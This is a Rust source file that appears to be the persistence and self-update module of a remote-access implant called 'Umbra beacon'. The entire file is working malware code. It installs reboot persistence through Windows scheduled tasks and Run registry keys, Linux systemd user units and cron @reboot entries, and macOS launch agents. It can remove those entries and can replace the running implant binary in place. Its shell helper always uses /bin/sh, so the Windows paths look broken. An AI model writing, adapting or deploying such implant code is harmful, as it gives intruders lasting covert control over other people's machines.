//! Installing the implant and replacing it.
//!
//! Two things an operator needs on a host they control: the implant should
//! survive a reboot, and a new version of the implant should be able to
//! replace the running one.  Both are here, and both report exactly what
//! they did, so the operator can undo them.

use std::fs;
use std::path::PathBuf;

use crate::upk::Value;

/// Install the implant so it starts again after a reboot.
///
/// The method is the one the platform offers: a scheduled task and a
/// registry key on Windows, a systemd user unit and a cron entry on Linux, a
/// launch agent on macOS.  The report says what was done.
pub fn persist(args: &Value) -> Result<String, String> {
    let method = args.str_or("method", "auto");
    let exe = std::env::current_exe().map_err(|e| format!("persist: {e}"))?;
    let exe = exe.to_string_lossy().to_string();
    let mut steps: Vec<String> = Vec::new();

    #[cfg(windows)]
    {
        if method == "auto" || method == "schtasks" {
            let command = format!(
                "schtasks /Create /SC ONLOGON /TN \"Umbra Beacon\" /TR \"\\\"{exe}\\\"\" /F"
            );
            steps.push(format!("schtasks: {}", run(&command)));
        }
        if method == "auto" || method == "registry" {
            let key = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run";
            let command = format!("reg add \"{key}\" /v Umbra /t REG_SZ /d \"{exe}\" /f");
            steps.push(format!("registry: {}", run(&command)));
        }
    }

    #[cfg(target_os = "linux")]
    {
        if method == "auto" || method == "systemd" {
            let unit = format!(
                "[Unit]\nDescription=Umbra beacon\n\n[Service]\nExecStart={exe}\nRestart=on-failure\n\n[Install]\nWantedBy=default.target\n"
            );
            let path = home().join(".config/systemd/user/umbra.service");
            if let Some(parent) = path.parent() {
                fs::create_dir_all(parent).map_err(|e| format!("persist: {e}"))?;
            }
            fs::write(&path, unit).map_err(|e| format!("persist: {e}"))?;
            steps.push(format!(
                "systemd: {} ({})",
                run("systemctl --user enable umbra.service"),
                path.display()
            ));
        }
        if method == "auto" || method == "cron" {
            let command = format!("(crontab -l 2>/dev/null; echo '@reboot {exe}') | crontab -");
            steps.push(format!("cron: {}", run(&command)));
        }
    }

    #[cfg(target_os = "macos")]
    {
        if method == "auto" || method == "launchd" {
            let plist = format!(
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<plist version=\"1.0\"><dict><key>Label</key><string>io.umbra.beacon</string><key>ProgramArguments</key><array><string>{exe}</string></array><key>RunAtLoad</key><true/></dict></plist>\n"
            );
            let path = home().join("Library/LaunchAgents/io.umbra.beacon.plist");
            if let Some(parent) = path.parent() {
                fs::create_dir_all(parent).map_err(|e| format!("persist: {e}"))?;
            }
            fs::write(&path, plist).map_err(|e| format!("persist: {e}"))?;
            steps.push(format!(
                "launchd: {} ({})",
                run("launchctl load -w ~/Library/LaunchAgents/io.umbra.beacon.plist"),
                path.display()
            ));
        }
    }

    if steps.is_empty() {
        return Err("persist: no method for this platform".to_string());
    }
    Ok(steps.join("\n"))
}

/// Remove the implant's own start-up entries.
///
/// Whatever `persist` added is removed again: the scheduled task, the
/// registry key, the systemd unit, the cron entry or the launch agent.
/// An operator who installed the implant has to be able to take it away
/// again, and the report says what was removed.
pub fn unpersist(args: &Value) -> Result<String, String> {
    let method = args.str_or("method", "auto");
    let mut steps: Vec<String> = Vec::new();

    #[cfg(windows)]
    {
        if method == "auto" || method == "schtasks" {
            steps.push(format!(
                "schtasks: {}",
                run("schtasks /Delete /TN \"Umbra Beacon\" /F")
            ));
        }
        if method == "auto" || method == "registry" {
            let key = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run";
            steps.push(format!(
                "registry: {}",
                run(&format!("reg delete \"{key}\" /v Umbra /f"))
            ));
        }
    }

    #[cfg(target_os = "linux")]
    {
        if method == "auto" || method == "systemd" {
            steps.push(format!(
                "systemd: {}",
                run("systemctl --user disable --now umbra.service")
            ));
            let path = home().join(".config/systemd/user/umbra.service");
            if path.exists() {
                let _ = fs::remove_file(&path);
                steps.push(format!("systemd: removed {}", path.display()));
            }
        }
        if method == "auto" || method == "cron" {
            // The cron entry is the line that mentions the implant.
            let command = "(crontab -l 2>/dev/null | grep -v 'umbra') | crontab -";
            steps.push(format!("cron: {}", run(command)));
        }
    }

    #[cfg(target_os = "macos")]
    {
        if method == "auto" || method == "launchd" {
            steps.push(format!(
                "launchd: {}",
                run("launchctl unload -w ~/Library/LaunchAgents/io.umbra.beacon.plist")
            ));
            let path = home().join("Library/LaunchAgents/io.umbra.beacon.plist");
            if path.exists() {
                let _ = fs::remove_file(&path);
                steps.push(format!("launchd: removed {}", path.display()));
            }
        }
    }

    if steps.is_empty() {
        return Err("unpersist: no method for this platform".to_string());
    }
    Ok(steps.join("\n"))
}

/// Replace the running implant with a new one.
///
/// The new binary is pushed to the host first (the `upload` task), and the
/// digest is checked before anything is replaced: an implant that installs
/// a file nobody verified is an implant that installs whatever the network
/// sent it.
pub fn update(args: &Value) -> Result<String, String> {
    let path = args.str_or("path", "");
    if path.is_empty() {
        return Err("update needs args.path".to_string());
    }
    let expected = args.str_or("sha256", "");
    let data = fs::read(&path).map_err(|e| format!("update: {e}"))?;
    let digest = crate::config::hex_encode(&crate::crypto::sha256(&data));
    if !expected.is_empty() && !expected.eq_ignore_ascii_case(&digest) {
        return Err(format!("update: the digest does not match ({digest})"));
    }
    let exe = std::env::current_exe().map_err(|e| format!("update: {e}"))?;
    let staged = exe.with_extension("umbra-new");
    fs::copy(&path, &staged).map_err(|e| format!("update: {e}"))?;

    #[cfg(windows)]
    {
        // Windows locks the running binary, so the old one is moved aside
        // and the new one takes its place.
        let old = exe.with_extension("umbra-old");
        let _ = fs::remove_file(&old);
        fs::rename(&exe, &old).map_err(|e| format!("update: {e}"))?;
        if let Err(e) = fs::rename(&staged, &exe) {
            let _ = fs::rename(&old, &exe);
            return Err(format!("update: {e}"));
        }
    }
    #[cfg(not(windows))]
    {
        // On Unix the running binary can be replaced in place.
        fs::rename(&staged, &exe).map_err(|e| format!("update: {e}"))?;
    }
    Ok(format!("the implant was replaced (sha256 {digest})\n"))
}

/// The home directory of the user the implant runs as.
fn home() -> PathBuf {
    std::env::var("HOME")
        .or_else(|_| std::env::var("USERPROFILE"))
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from("."))
}

/// Run a command and return its output.
fn run(command: &str) -> String {
    match std::process::Command::new("/bin/sh").arg("-c").arg(command).output() {
        Ok(out) => {
            let text = String::from_utf8_lossy(&out.stdout);
            let text = text.trim();
            if text.is_empty() {
                let err = String::from_utf8_lossy(&out.stderr);
                let err = err.trim();
                if err.is_empty() {
                    "ok".to_string()
                } else {
                    err.to_string()
                }
            } else {
                text.to_string()
            }
        }
        Err(e) => format!("failed: {e}"),
    }
}
